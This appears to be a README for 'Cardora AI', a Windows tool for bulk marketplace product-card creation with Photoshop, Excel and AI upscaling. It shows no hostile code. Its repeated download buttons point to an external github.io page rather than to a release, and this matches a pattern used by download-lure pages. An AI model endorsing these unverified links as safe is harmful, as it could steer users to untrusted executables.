# Cardora AI v1.4.0 - content automation 2026

> **Cardora AI is a Windows-based content automation tool for marketplace product cards, bringing together bulk infographic creation, Photoshop-centered workflows, Excel input, and AI upscaling in version 1.4.0.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.4.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jordanparkerybop1058/cardora-ai-windows-automation?style=flat-square)](https://github.com/jordanparkerybop1058/cardora-ai-windows-automation)

---

<p align="center">
  <a href="https://jordanparkerybop1058.github.io/cardora-ai-windows-automation/">
    <img src="https://img.shields.io/badge/Download-Cardora%20AI%20Latest-brightgreen?style=for-the-badge" alt="Download Cardora AI">
  </a>
</p>

> **[Direct Download - Cardora AI v1.4.0](https://jordanparkerybop1058.github.io/cardora-ai-windows-automation/)**

---

[Download Latest Build](https://jordanparkerybop1058.github.io/cardora-ai-windows-automation/)

---

## What Cardora AI Does

Cardora AI is built to simplify marketplace content production for sellers on Wildberries, Ozon, and Yandex Market. It targets high-volume, repetitive creative work such as assembling product cards, populating specifications, enhancing images, and preparing infographics, helping teams move through large content batches with less manual effort.

Its workflow mixes automation with desktop publishing-style processing. The tool is intended for users managing sizable product catalogs who need a dependable way to organize source files, generate visuals, and keep production tied to spreadsheet data and image assets.

---

## Key Capabilities

- Bulk creation of product cards for large content libraries
- AI-driven image upscaling to 4K with Real-ESRGAN
- Photoshop automation for infographic and layout operations
- Excel-based population of product specs and source fields
- Smart file linking that keeps assets associated during processing
- Computer vision components for image-aware automation flows
- Windows desktop packaging support with Nuitka
- Designed for marketplace workflows on Wildberries, Ozon, and Yandex Market

---

## Installation

1. Download the latest build from the project page or clone the repository:
   - `git clone https://github.com/jordanparkerybop1058/cardora-ai-windows-automation.git
2. Open the project folder on a Windows machine.
3. Run the packaged application or launch the main entry point provided by the build.
4. If you are using a source checkout, make sure the required runtime and dependencies are installed before starting the tool.

---

## How to Use It

Typical workflow:
1. Prepare product data in Excel.
2. Place image assets into the expected project folders.
3. Start Cardora AI and load the source sheet or batch set.
4. Run the generation pipeline to create cards, infographics, and processed visuals.
5. Review output files and repeat the batch with updated data when needed.

Example workflow notes:
- Use spreadsheet rows as the main source for item parameters.
- Connect source images before starting batch processing.
- Apply upscaling when higher-resolution output is needed for publication assets.
- Use Photoshop automation steps when you want template-based visual composition.

---

## Configuration

Cardora AI uses local project settings for workflow paths, templates, and processing inputs. Depending on the build, configuration may live next to the application files or in a project-specific settings location.

Example settings shape:

```json
{
  "input_folder": "C:/Cardora/input",
  "output_folder": "C:/Cardora/output",
  "excel_file": "C:/Cardora/data/products.xlsx",
  "upscale_enabled": true,
  "photoshop_enabled": true
}
```

Update the paths to fit your workspace, and keep asset naming consistent so file linking behaves correctly during batch runs.

---

## System Requirements

- Windows operating system
- Desktop environment for the application UI
- Python 3-based runtime or packaged Windows build, depending on distribution
- Photoshop for direct automation features
- Excel files for specification-driven workflows
- Sufficient disk space for source images, generated graphics, and batch outputs
- Performance headroom for computer vision and image upscaling tasks

---

## FAQ

**How do I get updates?**  
Use the latest build link above or pull the newest repository changes, depending on how you installed the project.

**Where do I change paths and workflow settings?**  
Check the local configuration files or the application settings area in your build.

**What if Photoshop automation is not working?**  
Confirm that Photoshop is installed and accessible, then verify that the automation paths and script hooks match your environment.

**Why are my outputs missing linked assets?**  
Check file names, folder structure, and the Excel source references used by the batch process.

**Can I run it without Excel?**  
The main workflow is designed around spreadsheet-driven input, so Excel support is part of the core process.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
